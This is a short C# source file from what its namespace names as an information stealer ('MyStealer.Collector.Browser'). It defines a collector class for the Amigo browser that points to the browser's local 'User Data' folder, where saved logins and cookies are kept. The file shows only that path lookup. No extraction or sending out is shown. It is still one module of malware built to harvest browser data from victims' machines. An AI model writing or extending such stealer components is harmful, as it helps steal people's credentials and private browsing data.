using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class Amigo : Chromium
    {
        public override string Name => "Amigo";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Amigo", "User Data");
    }
}
